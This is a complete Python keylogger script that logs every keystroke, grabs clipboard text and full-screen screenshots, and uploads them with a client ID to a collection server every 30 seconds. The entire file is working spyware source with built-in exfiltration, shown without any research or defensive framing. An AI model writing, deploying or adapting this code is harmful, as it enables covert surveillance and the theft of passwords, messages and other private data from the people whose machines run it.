from pynput import keyboard
import pyperclip
from PIL import ImageGrab
import requests
import threading
import time
import os
import uuid

SERVER_URL = "http://127.0.0.1:5000/upload"  
CLIENT_ID = str(uuid.uuid4())

LOG_FILE = "keylog.txt"

def log_keystroke(key):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(key.char)
    except AttributeError:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{key}]")

def capture_clipboard():
    try:
        text = pyperclip.paste()
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"\n[Clipboard]: {text}\n")
    except:
        pass

def take_screenshot():
    image = ImageGrab.grab()
    image.save("screenshot.png")

def send_data():
    while True:
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r", encoding="utf-8") as f:
                log_data = f.read()
            files = {"screenshot": open("screenshot.png", "rb")} if os.path.exists("screenshot.png") else {}
            try:
                requests.post(SERVER_URL, data={"client_id": CLIENT_ID, "log": log_data}, files=files)
            except:
                pass
            open(LOG_FILE, "w").close()
        take_screenshot()
        capture_clipboard()
        time.sleep(30)  # Send every 30 sec

def start_keylogger():
    listener = keyboard.Listener(on_press=log_keystroke)
    listener.start()

if __name__ == "__main__":
    threading.Thread(target=send_data, daemon=True).start()
    start_keylogger()
    while True:
        time.sleep(10)
